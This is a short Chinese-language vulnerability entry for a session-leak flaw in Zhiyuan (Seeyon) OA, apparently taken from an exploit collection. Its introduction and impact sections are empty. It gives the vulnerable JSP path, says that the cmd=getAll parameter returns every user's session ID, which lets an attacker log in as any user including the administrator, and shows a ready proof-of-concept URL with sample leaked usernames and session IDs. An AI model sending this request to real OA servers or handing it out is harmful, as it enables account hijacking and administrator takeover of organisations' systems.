致远OA Session泄漏漏洞
======================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

##### 漏洞位置:

    http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp

##### 漏洞详情:

    当cmd参数为getAll时，便可获取到所有用户的SessionID利用泄露的SessionID即可登录该用户，包括管理员

##### 请求方式:

    Get

##### POC:

    http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp?cmd=getAll

##### 回显内容

    weiph 9EA4F8832FA1C9BA99E3D13E2F01CAF7zhaozy F9244E7F1B8C39BB8919FAE8E19ED16
